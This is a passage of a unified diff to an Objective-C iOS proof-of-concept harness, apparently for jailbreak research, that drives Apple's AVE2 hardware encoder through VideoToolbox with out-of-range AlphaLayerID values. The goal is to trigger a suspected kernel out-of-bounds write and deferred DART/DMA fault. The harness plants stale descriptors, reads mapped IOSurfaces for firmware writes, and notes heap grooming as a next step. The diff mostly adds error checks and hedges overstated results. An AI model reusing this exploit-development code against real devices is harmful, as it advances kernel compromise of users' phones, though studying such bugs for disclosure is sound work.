         kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
         (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
@@ -588,6 +1052,7 @@ static void testAVE2_VideoToolbox(void) {
             return;
         }
         PASS(@"H.264 compression session created (AppleAVE2)");
+        chosenCodec = kCMVideoCodecType_H264;
     } else {
         PASS(@"HEVC compression session created (AppleAVE2)");
     }
@@ -598,7 +1063,9 @@ static void testAVE2_VideoToolbox(void) {
     VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering,
                          kCFBooleanTrue);
     VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel,
-                         kVTProfileLevel_HEVC_Main10_AutoLevel);
+        (chosenCodec == kCMVideoCodecType_HEVC)
+            ? kVTProfileLevel_HEVC_Main10_AutoLevel
+            : kVTProfileLevel_H264_High_AutoLevel);
 
     status = VTCompressionSessionPrepareToEncodeFrames(session);
     INFO(@"PrepareToEncode: %d", (int)status);
@@ -990,7 +1457,7 @@ static void oobOutputCallback(
         return;
     }
     if (sampleBuffer) {
-        PASS(@"Got encoded output after OOB trigger — survived!");
+        INFO(@"Got encoded output after OOB trigger (encode phase only; no corruption conclusion).");
     }
 }
 
@@ -1023,8 +1490,10 @@ static void runTier1OOB(void) {
     }
     PASS(@"HEVC session created (320x240, minimal)");
 
-    VTSessionSetProperty(session, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
-    VTSessionSetProperty(session, CFSTR("AllowFrameReordering"), kCFBooleanTrue);
+    if (VTSessionSetProperty(session, CFSTR("AllowTemporalCompression"), kCFBooleanTrue) != noErr)
+        INFO(@"AllowTemporalCompression set FAILED — config differs from logged intent");
+    if (VTSessionSetProperty(session, CFSTR("AllowFrameReordering"), kCFBooleanTrue) != noErr)
+        INFO(@"AllowFrameReordering set FAILED — config differs from logged intent");
 
     status = VTSessionSetProperty(session,
         CFSTR("NumberOfTemporalLayers"), (__bridge CFTypeRef)@(8));
@@ -1115,8 +1584,8 @@ static void runTier1OOB(void) {
     CFRelease(session);
 
     pocLog(@"");
-    PASS(@"=== Test complete without panic ===");
-    INFO(@"OOB write likely hit non-critical heap padding.");
+    INFO(@"=== Test complete: no panic observed this run ===");
+    INFO(@"Encode survival alone proves nothing about any OOB write.");
     INFO(@"Next: heap grooming to place controlled object adjacent.");
 }
 
@@ -1159,7 +1628,7 @@ static uint8_t *strip_emulation_prevention(const uint8_t *src, size_t src_len, s
     return dst;
 }
 
-typedef struct { const uint8_t *data; size_t len; size_t bit_pos; } BitReader;
+typedef struct { const uint8_t *data; size_t len; size_t bit_pos; BOOL overrun; } BitReader;
 
 static uint32_t br_read(BitReader *br, int n) {
     uint32_t val = 0;
@@ -1168,8 +1637,10 @@ static uint32_t br_read(BitReader *br, int n) {
         int bit_idx = 7 - (br->bit_pos % 8);
         if (byte_idx < br->len)
             val = (val << 1) | ((br->data[byte_idx] >> bit_idx) & 1);
-        else
+        else {
             val <<= 1;
+            br->overrun = YES; // past end of RBSP — parsed values are suspect
+        }
         br->bit_pos++;
     }
     return val;
@@ -1179,7 +1650,11 @@ static uint32_t br_read_ue(BitReader *br) {
     int lz = 0;
     while (br_read(br, 1) == 0 && lz < 32) lz++;
     if (lz == 0) return 0;
-    return (1u << lz) - 1 + br_read(br, lz);
+    if (lz >= 32) {
+        br->overrun = YES; // malformed codeNum — parse invalid from here (F4)
+        return 0x7FFFFFFF;
+    }
+    return (uint32_t)((1u << lz) - 1 + br_read(br, lz));
 }
 
 static void parseHEVCVPS(const uint8_t *raw, size_t raw_len) {
@@ -1192,7 +1667,7 @@ static void parseHEVCVPS(const uint8_t *raw, size_t raw_len) {
     INFO(@"  (raw %zu bytes → RBSP %zu bytes, %zu EP bytes removed)",
         raw_len, rbsp_len, raw_len - rbsp_len);
 
-    BitReader br = {rbsp, rbsp_len, 0};
+    BitReader br = {rbsp, rbsp_len, 0, NO};
 
     br_read(&br, 1);
     uint32_t nal_type = br_read(&br, 6);
@@ -1230,23 +1705,37 @@ static void parseHEVCVPS(const uint8_t *raw, size_t raw_len) {
         }
     }
 
+    if (br.overrun) {
+        INFO(@"  *** VPS PARSE: overrun during profile/tier/level — remaining fields invalid ***");
+        free(rbsp);
+        return;
+    }
+
     uint32_t ordering_present = br_read(&br, 1);
     uint32_t start_i = ordering_present ? 0 : max_sub_layers_minus1;
     for (uint32_t i = start_i; i <= max_sub_layers_minus1; i++) {
         uint32_t dpb = br_read_ue(&br);
         uint32_t reorder = br_read_ue(&br);
         uint32_t latency = br_read_ue(&br);
+        if (br.overrun) {
+            INFO(@"  *** VPS PARSE: overrun in sublayer ordering — remaining fields invalid ***");
+            free(rbsp);
+            return;
+        }
         INFO(@"  sublayer[%u]: dpb=%u reorder=%u latency=%u", i, dpb, reorder, latency);
     }
 
     uint32_t vps_max_layer_id = br_read(&br, 6);
     uint32_t vps_num_layer_sets_minus1 = br_read_ue(&br);
 
-    INFO(@"  *** vps_max_layer_id: %u (patch limit: <63) ***", vps_max_layer_id);
+    INFO(@"  *** vps_max_layer_id: %u (patch limit: <63)%@ ***", vps_max_layer_id,
+         br.overrun ? @"  [BITREADER OVERSHOT END — VALUE SUSPECT]" : @"");
     INFO(@"  vps_num_layer_sets_minus1: %u", vps_num_layer_sets_minus1);
 
-    if (vps_max_layer_id >= 63) {
-        PASS(@"  >>> OVER PATCH LIMIT! vps_max_layer_id=%u >= 63 <<<", vps_max_layer_id);
+    if (vps_max_layer_id >= 63 && !br.overrun) {
+        PASS(@"  >>> OVER PATCH LIMIT! vps_max_layer_id=%u >= 63 (parse clean) <<<", vps_max_layer_id);
+    } else if (vps_max_layer_id >= 63 && br.overrun) {
+        INFO(@"  vps_max_layer_id=%u but parse OVERSHOT input — value not trustworthy.", vps_max_layer_id);
     }
 
     for (uint32_t i = 1; i <= vps_num_layer_sets_minus1 && i < 64; i++)
@@ -1300,6 +1789,10 @@ static void parseHEVCVPS(const uint8_t *raw, size_t raw_len) {
         }
     }
 
+    if (br.overrun) {
+        INFO(@"  *** VPS PARSE OVERSHOT INPUT — fields past the truncation point");
+        INFO(@"      were invented zero-bits; treat this parse as INVALID. ***");
+    }
     free(rbsp);
 }
 
@@ -1699,13 +2192,21 @@ static void escalationOracleCallback(
 
 static CVPixelBufferRef createTestPixelBuffer(int w, int h) {
     CVPixelBufferRef pb = NULL;
-    CVPixelBufferCreate(kCFAllocatorDefault, w, h,
+    OSStatus cvStat = CVPixelBufferCreate(kCFAllocatorDefault, w, h,
         kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
         (__bridge CFDictionaryRef)@{
             (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
         }, &pb);
-    if (!pb) return NULL;
-    CVPixelBufferLockBaseAddress(pb, 0);
+    if (cvStat != noErr || !pb) {
+        FAIL(@"createTestPixelBuffer: CVPixelBufferCreate failed: %d", (int)cvStat);
+        return NULL;
+    }
+    CVReturn lk = CVPixelBufferLockBaseAddress(pb, 0);
+    if (lk != kCVReturnSuccess) {
+        FAIL(@"createTestPixelBuffer: lock failed (%d) — fills skipped", lk);
+        CVPixelBufferRelease(pb);
+        return NULL;
+    }
     void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
     if (y) memset(y, 0x80,
         CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
@@ -1984,8 +2485,8 @@ static void runEscalation(void) {
 // ============================================================
 
 static int g_narrowIndex = 0;
-static volatile BOOL g_narrowGotOutput = NO;
-static volatile BOOL g_narrowRunning = NO;
+static _Atomic BOOL g_narrowGotOutput = NO;
+static _Atomic BOOL g_narrowRunning = NO;
 
 static void narrowCallback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
@@ -2171,9 +2672,9 @@ static void runNarrowPanic(void) {
     idleWait(120, [NSString stringWithFormat:@"narrow test: %@", testLabel]);
 
     if (survived) {
-        PASS(@"=== %@: SURVIVED 120s idle — likely safe ===", testLabel);
+        INFO(@"=== %@: no fault observed through 120s post-teardown window (this run, this boot) ===", testLabel);
     } else {
-        PASS(@"=== %@: SURVIVED 120s idle (encode errored, no deferred fault) ===", testLabel);
+        INFO(@"=== %@: encode errored; no fault observed through 120s window (this run, this boot) ===", testLabel);
     }
 
     int next_idx = g_narrowIndex % (int)testLabels.count;
@@ -2188,7 +2689,7 @@ static void runNarrowPanic(void) {
 // Phase 2: Deferred DART Fault Tests (120-second idle-wait protocol)
 // ============================================================
 
-static volatile BOOL g_phase2Running = NO;
+static _Atomic BOOL g_phase2Running = NO;
 static int g_truncIdx = 0;
 
 static BOOL phase2Encode(int alphaID, NSString *label) {
@@ -2283,10 +2784,6 @@ static void runPhase2_IdleWait(void) {
     }
     g_phase2Running = YES;
 
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [UIApplication sharedApplication].idleTimerDisabled = YES;
-    });
-
     pocLog(@"");
     pocLog(@"╔══════════════════════════════════════════╗");
     pocLog(@"║  PHASE 2A: Alpha=255 + 120s Idle Wait   ║");
@@ -2323,12 +2820,12 @@ static void runPhase2_IdleWait(void) {
 
     LOG(@"*** 5-MINUTE IDLE WAIT BEGINS NOW ***");
     LOG(@"DO NOT TOUCH THE PHONE. DO NOT PRESS ANY BUTTON.");
-    LOG(@"If panic fires during this wait = CONFIRMED deferred DART.");
+    LOG(@"If panic fires during this wait = CONSISTENT WITH deferred DART (not proven by timing alone).");
     pocLog(@"");
 
     idleWait(300, @"deferred DART window for Alpha=255 (5 min)");
 
-    PASS(@"=== SURVIVED 300s idle — no deferred fault ===");
+    INFO(@"No panic observed during 300s idle window (this run, this boot).");
     INFO(@"Now testing: create/teardown one compression session...");
     INFO(@"If panic fires NOW = fault armed by encode, fired by lifecycle.");
     pocLog(@"");
@@ -2356,15 +2853,12 @@ static void runPhase2_IdleWait(void) {
     }
     pocLog(@"");
 
-    INFO(@"RESULT: Alpha=255 did NOT panic this run.");
-    INFO(@"The DART fault is probabilistic (race condition).");
+    INFO(@"RESULT: Alpha=255 did NOT panic this run (this boot).");
+    INFO(@"Fault mechanism unconfirmed; observed recurrence is consistent with a probabilistic trigger.");
     INFO(@"Run this test 5x total. Record hit rate + time-to-panic.");
     INFO(@"Collect .ips logs after any reboot during the wait.");
     pocLog(@"");
 
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [UIApplication sharedApplication].idleTimerDisabled = NO;
-    });
     g_phase2Running = NO;
 }
 
@@ -2375,17 +2869,14 @@ static void runPhase2_Truncation(void) {
     }
     g_phase2Running = YES;
 
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [UIApplication sharedApplication].idleTimerDisabled = YES;
-    });
-
-    int truncValues[] = {63, 127, 191};
-    int numValues = 3;
+    int truncValues[] = {62, 63, 127, 191};
+    int numValues = 4;
     int idx = g_truncIdx % numValues;
     g_truncIdx++;
 
     int val = truncValues[idx];
     int mod64 = val & 0x3F;
+    if (val == 62) LOG(@"LEGAL-CONTROL RUNG: expect NO panic in this run (62 is the in-range neighbor).");
 
     pocLog(@"");
     pocLog(@"╔══════════════════════════════════════════╗");
@@ -2396,8 +2887,8 @@ static void runPhase2_Truncation(void) {
     pocLog(@"");
     LOG(@"Test %d/%d: AlphaLayerID=%d (mod-64 = %d)", idx + 1, numValues, val, mod64);
     pocLog(@"");
-    INFO(@"All three values (63, 127, 191) reduce to 63 in the");
-    INFO(@"6-bit VPS bitstream field. Results tell us:");
+    INFO(@"63/127/191 all reduce to 63 in the 6-bit VPS field;");
+    INFO(@"62 is the LEGAL CONTROL for that boundary. Results tell us:");
     INFO(@"  ALL panic  -> kernel uses raw IOKit value -> wide OOB");
     INFO(@"  Only 63    -> kernel uses 6-bit truncation -> 1-element OOB");
     INFO(@"  None panic -> trigger requires -17691 error path (255-specific)");
@@ -2432,17 +2923,18 @@ static void runPhase2_Truncation(void) {
     LOG(@"*** 120-SECOND IDLE WAIT ***");
     idleWait(120, [NSString stringWithFormat:@"deferred DART window for Alpha=%d", val]);
 
-    PASS(@"=== Alpha=%d SURVIVED 120s ===", val);
+    INFO(@"Alpha=%d: no panic observed through 120s post-teardown window (this run, this boot).", val);
+    jbRunLog([NSString stringWithFormat:
+        @"RUNG | alpha=%d | verdict=no-panic-observed-120s | boot=%@ | build=%@",
+        val, jbBootID(), jbOSBuild()]);
     pocLog(@"");
 
     int nextIdx = g_truncIdx % numValues;
-    INFO(@"Next press: AlphaLayerID=%d (reboot first if panic occurred!)", truncValues[nextIdx]);
+    INFO(@"Next press: AlphaLayerID=%d — REBOOT BEFORE EACH RUNG.", truncValues[nextIdx]);
+    INFO(@"One fresh boot per rung; one session per rung; verdicts go in runlog.txt.");
     INFO(@"After all 3: compare which panicked to determine kernel behavior.");
     pocLog(@"");
 
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [UIApplication sharedApplication].idleTimerDisabled = NO;
-    });
     g_phase2Running = NO;
 }
 
@@ -2452,10 +2944,6 @@ static void runPhase2_Boundary(void) {
         return;
     }
     g_phase2Running = YES;
-
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [UIApplication sharedApplication].idleTimerDisabled = YES;
-    });
 
     // Known: 255 panics (deferred), 32/64 don't panic in 3s tests
     // Binary search: test mid-points with 120s waits
@@ -2508,7 +2996,10 @@ static void runPhase2_Boundary(void) {
     LOG(@"*** 120-SECOND IDLE WAIT ***");
     idleWait(120, [NSString stringWithFormat:@"boundary test Alpha=%d", val]);
 
-    PASS(@"=== Alpha=%d SURVIVED 120s ===", val);
+    INFO(@"Alpha=%d: no panic observed through 120s post-teardown window (this run, this boot).", val);
+    jbRunLog([NSString stringWithFormat:
+        @"RUNG | alpha=%d | verdict=no-panic-observed-120s | boot=%@ | build=%@",
+        val, jbBootID(), jbOSBuild()]);
     pocLog(@"");
 
     int nextIdx = g_boundIdx % 8;
@@ -2516,9 +3007,6 @@ static void runPhase2_Boundary(void) {
     INFO(@"Record which values panic and which survive to find boundary.");
     pocLog(@"");
 
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [UIApplication sharedApplication].idleTimerDisabled = NO;
-    });
     g_phase2Running = NO;
 }
 
@@ -2826,7 +3314,7 @@ static void runRunB_v2(void) {
     if (!armed) {
         INFO(@"WARNING: Got output (no -17691). Continuing anyway.");
     } else {
-        PASS(@"Armed: -17691 error path taken. +0xf8 should still be 1.");
+        PASS(@"Armed: -17691 error path taken (arm hypothesis; +0xf8 state unverified).");
     }
     pocLog(@"");
 
@@ -3040,7 +3528,7 @@ static void runRunC1(void) {
         INFO(@"WARNING: Got output (no -17691). Continuing anyway.");
         os_log(runcLog, "JBPoC-RUN-C1-ARM-WARNING not-armed");
     } else {
-        PASS(@"Armed: -17691 error path taken. Stale DMA descriptor planted.");
+        PASS(@"Armed: -17691 error path taken. Stale-descriptor hypothesis consistent (direct proof pending).");
         os_log(runcLog, "JBPoC-RUN-C1-ARMED confirmed");
     }
     pocLog(@"");
@@ -3060,10 +3548,11 @@ static void runRunC1(void) {
     NSString *stateData = [NSString stringWithFormat:
         @"RUN-C1 state\narmed_at=%@\nexit_at=%@\narmed=%@\nsession_invalidated=NO\n",
         armTime, exitTime, armed ? @"YES" : @"NO"];
-    [stateData writeToFile:stateFile atomically:YES
-        encoding:NSUTF8StringEncoding error:nil];
+    if (![stateData writeToFile:stateFile atomically:YES
+            encoding:NSUTF8StringEncoding error:nil])
+        FAIL(@"runc1 state file write FAILED — post-exit attribution weakened");
     int fd = open([stateFile UTF8String], O_RDONLY);
-    if (fd >= 0) { close(fd); }
+    if (fd >= 0) { fsync(fd); close(fd); }
 
     LOG(@"State written to %@", stateFile);
     LOG(@"ARM: %@  EXIT: %@", armTime, exitTime);
@@ -3446,10 +3935,6 @@ static void runDPrep(void) {
     }
     g_phase2Running = YES;
 
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [UIApplication sharedApplication].idleTimerDisabled = YES;
-    });
-
     os_log_t dLog = os_log_create("com.jbpoc.dprep", "readout");
 
     pocLog(@"");
@@ -3614,7 +4099,6 @@ static void runDPrep(void) {
         // Lock and snapshot this surface
         IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
         void *base = IOSurfaceGetBaseAddress(surf);
-        BOOL stored = NO;
         if (base && allocSz > 0 && allocSz < 4*1024*1024) {
             uint8_t *snap = (uint8_t *)malloc(allocSz);
             if (snap) {
@@ -3624,12 +4108,11 @@ static void runDPrep(void) {
                 extraSnapshots[extraCount] = snap;
                 extraSizes[extraCount] = allocSz;
                 extraCount++;
-                stored = YES;
             }
         }
         IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
 
-        if (!stored) {
+        if (base == NULL || allocSz == 0) {
             CFRelease(surf);
         }
     }
@@ -3723,7 +4206,10 @@ static void runDPrep(void) {
         NSString *now = [fmt stringFromDate:[NSDate date]];
 
         // Re-read the pixel buffer
-        CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+        if (CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly) != kCVReturnSuccess) {
+            INFO(@"T+%03ds: input lock FAILED — tick skipped", elapsed);
+            continue;
+        }
         uint8_t *curY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
         uint8_t *curUV = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 1);
 
@@ -3763,7 +4249,7 @@ static void runDPrep(void) {
             hitCount++;
             if (firstHitTime < 0) firstHitTime = elapsed;
 
-            PASS(@"*** HIT at T+%ds (%@) ***", elapsed, now);
+            INFO(@"*** SURFACE BYTES CHANGED (diagnostic) at T+%ds (%@) ***", elapsed, now);
             if (yDiffs > 0) {
                 LOG(@"  Y plane: %d bytes changed, first at offset 0x%x (0x%02x→0x%02x)",
                     yDiffs, firstYOff, firstYOld, firstYNew);
@@ -3861,8 +4347,8 @@ static void runDPrep(void) {
     pocLog(@"");
     LOG(@"═══════════════════════════════════════════");
     if (hitCount > 0) {
-        PASS(@"*** MODEL (b) CONFIRMED ***");
-        LOG(@"Firmware DMA writes detected in mapped surface!");
+        PASS(@"*** SURFACE BYTES CHANGED (diagnostic; model-b-consistent) ***");
+        LOG(@"Consistent with, but not proof of, firmware DMA writes.");
         LOG(@"Total readout hits: %d, first at T+%ds", hitCount, firstHitTime);
         LOG(@"The write is ALREADY landing — no race needed.");
         LOG(@"The panic at ~160s is just the mapping going away.");
@@ -3895,7 +4381,8 @@ static void runDPrep(void) {
         hitCount, firstHitTime,
         hitCount > 0 ? @"(b) continuous" : @"(a) deferred"];
     NSString *resultPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/dprep_result.txt"];
-    [resultStr writeToFile:resultPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    if (![resultStr writeToFile:resultPath atomically:YES encoding:NSUTF8StringEncoding error:nil])
+        FAIL(@"dprep result write FAILED — record preserved only in live log");
     INFO(@"Results written to %@", resultPath);
 
     // Clean up — invalidation triggers teardown/unmap, same path as Run A.
@@ -3916,9 +4403,6 @@ static void runDPrep(void) {
         CFRelease(extraSurfs[si]);
     }
 
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [UIApplication sharedApplication].idleTimerDisabled = NO;
-    });
     g_phase2Running = NO;
 
     PASS(@"D-PREP readout complete. Expect panic in ~160s (same as Run A).");
@@ -3941,19 +4425,33 @@ static void runDPrep(void) {
 // Also: invalidation WILL panic. The .ips is data.
 // ============================================================
 
+// F4: sample collections guarded by dedicated serial queues; bound-check +
+// store + increment (and free) run as one transaction, since atomics alone
+// leave those sequences racy.
+static dispatch_queue_t jbDp2Queue(void) {
+    static dispatch_queue_t q; static dispatch_once_t once;
+    dispatch_once(&once, ^{ q = dispatch_queue_create("jb.dp2samples", DISPATCH_QUEUE_SERIAL); });
+    return q;
+}
+static dispatch_queue_t jbExp3Queue(void) {
+    static dispatch_queue_t q; static dispatch_once_t once;
+    dispatch_once(&once, ^{ q = dispatch_queue_create("jb.exp3samples", DISPATCH_QUEUE_SERIAL); });
+    return q;
+}
+
 // D-prep-2 output collection: ring buffer of sample buffers
 #define DPREP2_MAX_SAMPLES 128
 static CMSampleBufferRef g_dp2Samples[DPREP2_MAX_SAMPLES];
-static volatile int g_dp2SampleIdx = 0;
-static volatile int g_dp2Errors = 0;
-static volatile BOOL g_dp2Armed = NO;
+static _Atomic int g_dp2SampleIdx = 0;
+static _Atomic int g_dp2Errors = 0;
+static _Atomic BOOL g_dp2Armed = NO;
 
 // D-prep-2 retained canary archive: keeps ALL sample buffers from t=0
 // (pre-arm baseline through post-arm readout) so we have actual bytes
 // if any output goes anomalous — one shot before any potential fire.
 #define DPREP2_ARCHIVE_MAX 512
 static CMSampleBufferRef g_dp2Archive[DPREP2_ARCHIVE_MAX];
-static volatile int g_dp2ArchiveIdx = 0;
+static _Atomic int g_dp2ArchiveIdx = 0;
 static int g_dp2ArchiveArmMark = -1; // index where arming occurred
 
 static void dp2ArchiveSample(CMSampleBufferRef sbuf) {
@@ -3964,14 +4462,16 @@ static void dp2ArchiveSample(CMSampleBufferRef sbuf) {
 }
 
 static void dp2FreeArchive(void) {
-    for (int i = 0; i < g_dp2ArchiveIdx; i++) {
-        if (g_dp2Archive[i]) {
-            CFRelease(g_dp2Archive[i]);
-            g_dp2Archive[i] = NULL;
+    dispatch_sync(jbDp2Queue(), ^{
+        for (int i = 0; i < g_dp2ArchiveIdx; i++) {
+            if (g_dp2Archive[i]) {
+                CFRelease(g_dp2Archive[i]);
+                g_dp2Archive[i] = NULL;
+            }
         }
-    }
-    g_dp2ArchiveIdx = 0;
-    g_dp2ArchiveArmMark = -1;
+        g_dp2ArchiveIdx = 0;
+        g_dp2ArchiveArmMark = -1;
+    });
 }
 
 // Q4 firmware metadata offsets in coded-output buffer (type 0x0b):
@@ -3994,19 +4494,20 @@ static void dprep2Callback(
         g_dp2Errors++;
         return;
     }
-    if (sampleBuffer && g_dp2SampleIdx < DPREP2_MAX_SAMPLES) {
-        CFRetain(sampleBuffer);
-        g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
-        g_dp2SampleIdx++;
-        dp2ArchiveSample(sampleBuffer);
-    } else if (sampleBuffer && g_dp2SampleIdx >= DPREP2_MAX_SAMPLES) {
-        INFO(@"[D-prep-2] Sample buffer full (%d), dropping sample", DPREP2_MAX_SAMPLES);
-        dp2ArchiveSample(sampleBuffer);
+    if (sampleBuffer) {
+        dispatch_sync(jbDp2Queue(), ^{
+            if (g_dp2SampleIdx < DPREP2_MAX_SAMPLES) {
+                CFRetain(sampleBuffer);
+                g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
+                g_dp2SampleIdx++;
+            }
+            dp2ArchiveSample(sampleBuffer);
+        });
     }
 }
 
 // Isolated trigger-session callback — any error without a sample = arm
-static volatile int g_dp2ArmedStatus = 0;
+static _Atomic int g_dp2ArmedStatus = 0;
 
 static void dprep2TriggerCallback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
@@ -4017,7 +4518,7 @@ static void dprep2TriggerCallback(
         g_dp2Armed = YES;
         g_dp2ArmedStatus = (int)status;
         if (status == -17691) {
-            PASS(@"[TRIGGER-CB] -17691 — classic arm");
+            PASS(@"[TRIGGER-CB] -17691 — classic arm signature (hypothesis)");
         } else {
             PASS(@"[TRIGGER-CB] %d — alternate arm signature, continuing",
                  (int)status);
@@ -4030,7 +4531,7 @@ static void dprep2TriggerCallback(
 }
 
 // Isolated observation-session callback — tracks cross-session rejection
-static volatile int g_dp2ObsRejectCount = 0;
+static _Atomic int g_dp2ObsRejectCount = 0;
 
 static void dprep2ObsCallback(
     void *ctx, void *sourceFrameRefCon, OSStatus status,
@@ -4046,14 +4547,15 @@ static void dprep2ObsCallback(
         INFO(@"[OBS-CB] error: %d", (int)status);
         return;
     }
-    if (sampleBuffer && g_dp2SampleIdx < DPREP2_MAX_SAMPLES) {
-        CFRetain(sampleBuffer);
-        g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
-        g_dp2SampleIdx++;
-        dp2ArchiveSample(sampleBuffer);
-    } else if (sampleBuffer && g_dp2SampleIdx >= DPREP2_MAX_SAMPLES) {
-        INFO(@"[OBS-CB] Sample buffer full (%d), dropping", DPREP2_MAX_SAMPLES);
-        dp2ArchiveSample(sampleBuffer);
+    if (sampleBuffer) {
+        dispatch_sync(jbDp2Queue(), ^{
+            if (g_dp2SampleIdx < DPREP2_MAX_SAMPLES) {
+                CFRetain(sampleBuffer);
+                g_dp2Samples[g_dp2SampleIdx] = sampleBuffer;
+                g_dp2SampleIdx++;
+            }
+            dp2ArchiveSample(sampleBuffer);
+        });
     }
 }
 
@@ -4064,19 +4566,25 @@ static NSData *dp2ExtractBitstream(CMSampleBufferRef sbuf) {
     size_t len = CMBlockBufferGetDataLength(block);
     if (len == 0) return nil;
     NSMutableData *data = [NSMutableData dataWithLength:len];
-    CMBlockBufferCopyDataBytes(block, 0, len, data.mutableBytes);
+    OSStatus cbStat = CMBlockBufferCopyDataBytes(block, 0, len, data.mutableBytes);
+    if (cbStat != noErr) {
+        INFO(@"bitstream copy failed (%d) — sample dropped", (int)cbStat);
+        return nil;
+    }
     return data;
 }
 
 static void dp2FreeSamples(void) {
-    for (int i = 0; i < g_dp2SampleIdx; i++) {
-        if (g_dp2Samples[i]) {
-            CFRelease(g_dp2Samples[i]);
-            g_dp2Samples[i] = NULL;
+    dispatch_sync(jbDp2Queue(), ^{
+        for (int i = 0; i < g_dp2SampleIdx; i++) {
+            if (g_dp2Samples[i]) {
+                CFRelease(g_dp2Samples[i]);
+                g_dp2Samples[i] = NULL;
+            }
         }
-    }
-    g_dp2SampleIdx = 0;
-    g_dp2Errors = 0;
+        g_dp2SampleIdx = 0;
+        g_dp2Errors = 0;
+    });
 }
 
 static NSData *dp2ExtractFullBlock(CMSampleBufferRef sbuf) {
@@ -4086,7 +4594,11 @@ static NSData *dp2ExtractFullBlock(CMSampleBufferRef sbuf) {
     size_t totalLen = CMBlockBufferGetDataLength(block);
     if (totalLen == 0) return nil;
     NSMutableData *data = [NSMutableData dataWithLength:totalLen];
-    CMBlockBufferCopyDataBytes(block, 0, totalLen, data.mutableBytes);
+    OSStatus cbStat = CMBlockBufferCopyDataBytes(block, 0, totalLen, data.mutableBytes);
+    if (cbStat != noErr) {
+        INFO(@"full-block copy failed (%d) — sample dropped", (int)cbStat);
+        return nil;
+    }
     return data;
 }
 
@@ -4096,10 +4608,6 @@ static void runDPrep2(void) {
         return;
     }
     g_phase2Running = YES;
-
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [UIApplication sharedApplication].idleTimerDisabled = YES;
-    });
 
     os_log_t dLog = os_log_create("com.jbpoc.dprep2", "output-readout");
 
@@ -4179,7 +4687,7 @@ static void runDPrep2(void) {
     if (readback) {
         int rbVal = [(__bridge NSNumber *)readback intValue];
         if (rbVal == 255) {
-            PASS(@"Readback verify: AlphaLayerID=%d (confirmed)", rbVal);
+            PASS(@"Readback verify: AlphaLayerID=%d stored in session (kernel delivery unproven)", rbVal);
         } else {
             FAIL(@"Readback MISMATCH: expected 255, got %d", rbVal);
         }
@@ -4244,15 +4752,16 @@ static void runDPrep2(void) {
             [NSDate date], armTime, g_dp2ArchiveIdx];
         NSString *noFirePath = [NSHomeDirectory()
             stringByAppendingPathComponent:@"Documents/dprep2_nofire.txt"];
-        [noFireResult writeToFile:noFirePath atomically:YES
-                         encoding:NSUTF8StringEncoding error:nil];
+        if (![noFireResult writeToFile:noFirePath atomically:YES
+                             encoding:NSUTF8StringEncoding error:nil])
+            FAIL(@"no-fire record write FAILED");
 
         // Do NOT invalidate — leave trigger session alive, keep PTEs mapped
         // If panic comes later, the .ips is still valid data
         g_phase2Running = NO;
         return;
     }
-    PASS(@"Armed (status=%d). Firmware DMA descriptor is stale-armed.", g_dp2ArmedStatus);
+    PASS(@"Armed (status=%d) — error signature confirmed; stale-descriptor state is a hypothesis.", g_dp2ArmedStatus);
     os_log(dLog, "JBPoC-DPREP2v4-ARMED status=%d", g_dp2ArmedStatus);
 
     // Step 3: OBSERVATION SESSION — continuous canary encode for 240s
@@ -4350,21 +4859,23 @@ static void runDPrep2(void) {
 
             if (elapsed <= DPREP2_TRAIN_CUTOFF_S) {
                 // TRAINING PHASE: T+0 to T+45s — build envelope from these samples
-                // Skip first 2 frames (warmup: IDR + early P) to match steady-state test frames
-                if (curBS && curBS.length > 0 && frameNum > 2) {
+                if (curBS && curBS.length > 0) {
                     [trainBS addObject:curBS];
                     if (curBS.length > baseMaxLen) baseMaxLen = curBS.length;
-                    INFO(@"T+%03ds (%@): TRAIN sample %zu (%zu bytes, frame %d)",
-                         elapsed, now, trainBS.count, curBS.length, frameNum - 1);
-                } else if (curBS && curBS.length > 0 && frameNum <= 2) {
-                    INFO(@"T+%03ds (%@): WARMUP frame %d (%zu bytes, skipping)",
-                         elapsed, now, frameNum - 1, curBS.length);
+                    INFO(@"T+%03ds (%@): TRAIN sample %zu (%zu bytes)",
+                         elapsed, now, trainBS.count, curBS.length);
                 }
 
                 // At the cutoff, build the variance envelope
                 if (elapsed >= DPREP2_TRAIN_CUTOFF_S - 5 && !varMin && trainBS.count > 1) {
-                    varMin = (uint8_t *)malloc(baseMaxLen);
-                    varMax = (uint8_t *)malloc(baseMaxLen);
+                    uint8_t *mn = (uint8_t *)malloc(baseMaxLen);
+                    uint8_t *mx = (uint8_t *)malloc(baseMaxLen);
+                    if (!mn || !mx) {
+                        free(mn); free(mx);
+                        FAIL(@"Envelope malloc failed — envelope checks skipped");
+                        varMin = NULL; varMax = NULL;
+                    } else {
+                    varMin = mn; varMax = mx;
                     memset(varMin, 0xFF, baseMaxLen);
                     memset(varMax, 0x00, baseMaxLen);
                     for (NSData *bs in trainBS) {
